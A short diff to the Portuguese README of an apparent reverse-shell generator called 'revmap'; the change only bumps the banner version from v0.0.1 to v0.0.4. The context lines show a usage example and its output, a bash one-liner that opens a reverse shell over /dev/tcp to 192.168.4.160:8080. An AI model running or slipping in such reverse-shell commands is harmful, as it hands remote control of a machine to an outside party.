@@ -40,7 +40,7 @@ Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele s
 |  _| -_| | |     | .'| . |
 |_| |___|\_/|_|_|_|__,|  _|
                       |_|  
-        v0.0.1 - @joaoviictorti 
+        v0.0.4 - @joaoviictorti 
 
 options:
   --h, --help            show this help message and exit
@@ -68,7 +68,7 @@ revmap --ip 192.168.4.160 --port 8080 --payload bash
 |  _| -_| | |     | .'| . |
 |_| |___|\_/|_|_|_|__,|  _|
                       |_|  
-        v0.0.1 - @joaoviictorti 
+        v0.0.4 - @joaoviictorti 
                                                
 
 bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
